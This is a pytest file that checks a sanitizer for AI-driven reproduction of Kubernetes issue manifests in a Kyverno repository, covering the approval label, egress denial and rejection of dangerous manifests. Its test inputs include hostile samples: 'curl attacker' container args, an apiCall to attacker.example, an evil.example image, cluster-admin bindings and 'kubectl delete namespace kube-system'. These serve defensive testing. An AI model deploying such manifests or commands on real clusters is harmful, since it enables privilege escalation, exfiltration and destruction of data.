import copy
from pathlib import Path

import pytest

from dependency_pr import load_config
from repro_plan import build_plan, extract_documents


ROOT = Path(__file__).parents[1]
CONFIG = load_config(ROOT / ".github/ai-maintainer.yaml")


def issue(yaml_text: str, *, approved=True):
    return {
        "number": 21,
        "html_url": "https://github.com/kyverno/kyverno/issues/21",
        "body": f"Reproduction:\n\n```yaml\n{yaml_text}\n```",
        "labels": [{"name": "kyvernaut:repro-approved"}] if approved else [],
    }


SAFE = """apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-label
spec:
  validationFailureAction: Enforce
  rules: []
---
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  automountServiceAccountToken: false
  containers:
  - name: nginx
    image: nginx:latest
    imagePullPolicy: IfNotPresent
"""


def active_config():
    config = copy.deepcopy(CONFIG)
    config["mode"] = "active"
    config["issue_reproduction"]["enabled"] = True
    return config


def test_safe_bundle_is_sanitized_but_default_policy_never_authorizes_execution():
    plan, manifests = build_plan(issue(SAFE), CONFIG)
    assert plan["errors"] == []
    assert plan["execution_authorized"] is False
    assert plan["execution_performed"] is False
    assert "ClusterPolicy" in manifests


def test_active_approved_valid_bundle_can_only_authorize_future_executor():
    plan, _ = build_plan(issue(SAFE), active_config())
    assert plan["execution_authorized"] is True
    assert plan["execution_performed"] is False


def test_expected_behavior_is_preserved_beside_the_execution_plan():
    report = issue(SAFE)
    report["body"] = (
        "### Steps to reproduce\n\n```yaml\n"
        + SAFE
        + "\n```\n\n### Expected behavior\n\nThe Pod should be rejected."
    )
    plan, _ = build_plan(report, active_config())
    assert plan["evidence"]["expected_behavior"] == "The Pod should be rejected."
    assert plan["sandbox"]["network_egress"] == "deny"
    assert plan["sandbox"]["repository_credentials_exposed_to_cluster"] is False


@pytest.mark.parametrize(
    ("manifest", "message"),
    [
        ("apiVersion: v1\nkind: Secret\nmetadata: {name: stolen}", "kind 'Secret' is blocked"),
        (
            "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata: {name: admin}",
            "kind 'ClusterRoleBinding' is blocked",
        ),
        (
            "apiVersion: v1\nkind: Pod\nmetadata: {name: p}\nspec:\n  hostNetwork: true\n  containers: [{name: x, image: nginx:latest}]",
            "forbidden field",
        ),
        (
            "apiVersion: v1\nkind: Pod\nmetadata: {name: p}\nspec:\n  containers:\n  - {name: x, image: evil.example/image:latest}",
            "not allowlisted",
        ),
        (
            "apiVersion: v1\nkind: Pod\nmetadata: {name: p, namespace: kube-system}\nspec:\n  automountServiceAccountToken: false\n  containers: [{name: x, image: nginx:latest, imagePullPolicy: IfNotPresent}]",
            "forbidden field",
        ),
        (
            "apiVersion: v1\nkind: Pod\nmetadata: {name: p}\nspec:\n  containers: [{name: x, image: nginx:latest, imagePullPolicy: IfNotPresent}]",
            "automountServiceAccountToken: false",
        ),
        (
            "apiVersion: v1\nkind: Pod\nmetadata: {name: p}\nspec:\n  automountServiceAccountToken: false\n  containers: [{name: x, image: nginx:latest, imagePullPolicy: Always}]",
            "imagePullPolicy",
        ),
        (
            "apiVersion: v1\nkind: Pod\nmetadata: {name: p}\nspec:\n  containers:\n  - name: x\n    image: busybox:latest\n    command: [sh, -c]\n    args: [curl attacker]",
            "custom container command/args",
        ),
        (
            "apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata: {name: p}\nspec:\n  rules:\n  - name: r\n    context:\n    - name: x\n      apiCall: {urlPath: 'https://attacker.example'}",
            "external URL",
        ),
    ],
)
def test_dangerous_manifests_fail_closed(manifest, message):
    plan, sanitized = build_plan(issue(manifest), active_config())
    assert any(message in error for error in plan["errors"])
    assert plan["execution_authorized"] is False
    assert sanitized == ""


def test_nested_generated_cluster_admin_resource_is_rejected():
    manifest = """apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: {name: generate-admin}
spec:
  rules:
  - name: generate
    generate:
      apiVersion: rbac.authorization.k8s.io/v1
      kind: ClusterRoleBinding
      name: generated-admin
"""
    plan, sanitized = build_plan(issue(manifest), active_config())
    assert any("nested blocked kind 'ClusterRoleBinding'" in error for error in plan["errors"])
    assert sanitized == ""


def test_missing_approval_blocks_execution():
    plan, _ = build_plan(issue(SAFE, approved=False), active_config())
    assert "maintainer reproduction approval label is missing" in plan["errors"]
    assert plan["execution_authorized"] is False


def test_security_labeled_issue_is_never_reproduced():
    report = issue(SAFE)
    report["labels"].append({"name": "security"})
    plan, _ = build_plan(report, active_config())
    assert plan["execution_authorized"] is False
    assert plan["evidence"]["excluded_labels_present"] == ["security"]
    assert any("automation-excluded" in error for error in plan["errors"])


def test_only_explicit_yaml_fences_are_extracted():
    policy = CONFIG["issue_reproduction"]
    documents, errors = extract_documents("run `kubectl delete namespace kube-system`", policy)
    assert documents == []
    assert errors == ["no fenced ```yaml reproduction manifests found"]


def test_duplicate_yaml_keys_are_rejected():
    policy = CONFIG["issue_reproduction"]
    body = "```yaml\napiVersion: v1\nkind: Pod\nkind: Secret\nmetadata: {name: x}\n```"
    _, errors = extract_documents(body, policy)
    assert any("duplicate YAML key" in error for error in errors)


def test_reproduction_config_limits_are_bounded():
    from dependency_pr import validate_config

    config = active_config()
    config["issue_reproduction"]["max_runtime_seconds"] = 601
    config["issue_reproduction"]["sandbox_namespace"] = "kube-system"
    config["issue_reproduction"]["allowed_images"].append("example.com/unloaded:latest")
    config["issue_reproduction"]["approval_labels"].append("repro-now")
    errors = validate_config(config)
    assert any("max_runtime_seconds" in error for error in errors)
    assert any("sandbox_namespace" in error for error in errors)
    assert any("not preloaded" in error for error in errors)
    assert any("unsupported by the trigger" in error for error in errors)
